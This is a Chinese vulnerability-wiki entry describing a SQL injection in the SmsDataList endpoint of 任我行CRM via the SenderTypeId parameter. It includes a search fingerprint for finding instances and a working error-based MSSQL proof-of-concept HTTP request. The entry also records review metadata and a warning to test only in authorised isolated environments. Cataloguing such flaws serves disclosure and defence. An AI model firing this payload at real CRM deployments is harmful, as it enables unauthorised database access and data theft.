---
source: "Threekiii/Vulnerability-Wiki"
title: "任我行CRM SmsDataList SenderTypeId SQL注入"
product: "任我行CRM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "SQL Server，版本未知"
prerequisites: "无Cookie请求，实际权限未知"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/Threekiii/Vulnerability-Wiki"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E4%BB%BB%E6%88%91%E8%A1%8C-CRM-SmsDataList/%E4%BB%BB%E6%88%91%E8%A1%8C-CRM-SmsDataList-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
id: "vw-23c7bed566f6fea25d6d1658"
entity_id: "ve-5fb82131a774c2dc4416b273"
schema_version: "1"
canonical: "Web安全/商业软件/任我行/任我行 CRM SmsDataList SQL注入漏洞.md"
relation_type: "duplicate_of"
---

# 任我行CRM SmsDataList SenderTypeId SQL注入

## 条目说明

- 对象与具体问题：任我行CRM；SmsDataList SenderTypeId SQL注入
- 版本、配置及部署条件：SQL Server，版本未知
- 认证与权限前提：无Cookie请求，实际权限未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 与270全文核心及图片内容命名相同，目录任我行-CRM-SmsDataList把接口当产品
- 结果图未视检、无根因/补丁/版本，不能由重复转载提高证据等级

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

### 漏洞描述

*任我行CRM*系统是客户关系管理,集OA自动化办公、OM目标管理、KM知识管理、HR人力资源为一体集成的企业管理软件。

任我行 CRM SmsDataList 接口存在SQL注入漏洞，攻击者通过漏洞可以执行任意数据库语句，获取敏感信息。

### 漏洞影响

任我行 CRM

### 网络测绘

"欢迎使用任我行CRM"

### 漏洞复现

登陆页面

![image-20230828150050416](./.resource/任我行-CRM-SmsDataList-SQL注入漏洞/media/image-20230828150050416.png)

验证POC

```http
POST /SMS/SmsDataList/?pageIndex=1&pageSize=30 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: 

Keywords=&StartSendDate=2020-06-17&EndSendDate=2020-09-17&SenderTypeId=0000000000' and 1=convert(int,(sys.fn_sqlvarbasetostr(HASHBYTES('MD5','123456')))) AND 'CvNI'='CvNI
```

![image-20230828150106754](./.resource/任我行-CRM-SmsDataList-SQL注入漏洞/media/image-20230828150106754.png)

---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
